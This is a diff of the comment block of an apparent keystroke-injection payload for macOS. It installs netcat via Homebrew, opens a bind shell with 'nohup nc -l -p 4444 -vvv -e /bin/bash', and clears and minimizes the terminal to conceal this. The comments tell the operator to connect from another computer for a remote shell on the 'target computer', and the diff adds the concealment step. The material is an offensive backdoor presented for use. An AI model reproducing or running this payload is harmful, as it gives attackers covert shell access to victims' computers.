@@ -1,10 +1,12 @@
 REM installs netcat using home-brew (can adjust delay) 
 REM Runs the command nohup nc -l -p 4444 -vvv -e /bin/bash to start a netcat listener on port 4444 
-REM Gui m minimizes the terminal window.
+REM clears the terminal
+REM Gui m minimizes the terminal window
+
 
 
 REM Now on your separate computer in your terminal Run the command 'nc <remote-ip> 4444' 
-REM replacing '<remote-ip>' with the IP address of the remote computer.
+REM replacing '<remote-ip>' with the IP address of the target computer.
 REM I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
 REM If the connection is successful, you should now have a remote shell session on the remote computer.
 
